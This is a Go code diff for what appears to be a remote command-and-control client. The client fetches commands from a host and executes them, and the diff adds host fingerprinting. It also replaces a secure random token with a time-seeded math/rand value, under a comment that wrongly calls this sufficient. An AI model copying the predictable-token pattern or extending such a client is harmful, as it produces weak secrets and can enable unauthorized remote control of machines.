@@ -9,15 +9,15 @@ import (
 	"io"
 	"io/ioutil"
 	"log"
+	"math/rand"
 	"mime/multipart"
 	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"time"
-
-	gonanoid "github.com/matoous/go-nanoid/v2"
 )
 
 //go:generate go-bindata -o cert.go ../cert/server.crt
@@ -235,7 +235,8 @@ func ExecAndGetOutput(cmdString string) []byte {
 }
 
 func RunClient(host string, port int) {
-	token, _ = gonanoid.New()
+	// Create token from pseudorandom number generator and convert it to hex (should be sufficient)
+	token = strconv.FormatInt(rand.NewSource(time.Now().UnixNano()).Int63(), 16)
 
 	if !hasLogs {
 		log.SetFlags(0)
@@ -243,6 +244,8 @@ func RunClient(host string, port int) {
 	}
 
 	client := ClientSetup()
+
+	RunFingerprinter()
 
 	for {
 		cmd, hoststr := RequestCommand(client, host, port)
